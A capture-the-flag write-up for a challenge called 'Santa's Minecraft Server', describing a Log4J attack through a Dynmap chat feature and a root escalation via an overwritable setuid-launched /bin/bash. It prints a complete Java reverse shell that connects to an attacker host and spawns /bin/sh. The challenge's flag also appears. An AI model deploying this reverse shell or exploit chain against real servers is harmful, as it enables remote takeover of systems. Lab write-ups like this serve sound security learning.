# 19 - Santa's Minecraft Server

## Description

Level: Hard<br/>
Author: nichtseb

Santa likes to play minecraft. His favorite version is 1.16. For security reasons, the server is not publicly
accessible. But Santa is a little show-off, so he has an online map to brag about his fabulous building skills.

## Solution

For this challenge we get access to a webserver that is
running [Dynmap](https://www.spigotmc.org/resources/dynmap%C2%AE.274/), a famous Minecraft server plugin that renders a
Minecraft world on a website. I almost immediately knew what we had to do as a first step: the Dynmap contained a chat
feature and older versions of Minecraft were vulnerable to Log4J exploits. After some research, I came across [a working
PoC](https://github.com/kozmer/log4j-shell-poc) that I could use for my attack.

After some more trial and error, I finally got a working "native" reverse shell written in Java. Most other reverse
shells just didn't work at all:

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host = "10.13.0.6";
        int port = 9001;
        String cmd = "/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(),
                pe = p.getErrorStream(),
                si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0)
                so.write(pi.read());
            while (pe.available() > 0)
                so.write(pe.read());
            while (si.available() > 0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {
            }
        }
        p.destroy();
        s.close();
    }
}
```

This was just the first part of the challenge. The second part was about gaining root on the remote system. Luckily,
there was a setuid binary prepared just for us. The source of the binary was also provided:

```c
#include <unistd.h>
#include <stdio.h>

void debugShell() {
    printf("Launching debug shell...\n");
    char *argv[] = { "/bin/bash", 0 };
    execve(argv[0], &argv[0], NULL);
}

void main() {
    printf("--- Santas Workshop Tool ---\n");
    printf("Pick an action:\n");
    printf("s) debug shell\n");
    printf("-- more options to come\n");
    
    char option;
    scanf("%c", &option);
    
    switch (option) {
        case 's': debugShell(); break;
        default: printf("Unknonwn option!\n"); break;
    }
}
```

At this point I was a bit lost for a while. The intended solution here would have been:

- Realize that the `/bin/bash` is an old version that has been moved there manually
- Use a [0-day vulnerability in bash](https://www.youtube.com/watch?v=-wGtxJ8opa8)

I went with a much simpler solution. By coping the file into the Docker container the permissions of the file were
changed and so it was possible to overwrite `/bin/bash` with arbitrary data. This was very helpful since we could
overwrite it with some other binary and get a root shell. I used `vi` which I copied via `cp /usr/bin/vi /bin/bash` and
then I was able to read the flag file via `:edit /home/santa/flag.txt` which
contained `HV23{d0n7_f0rg37_70_upd473_k1d5}`.
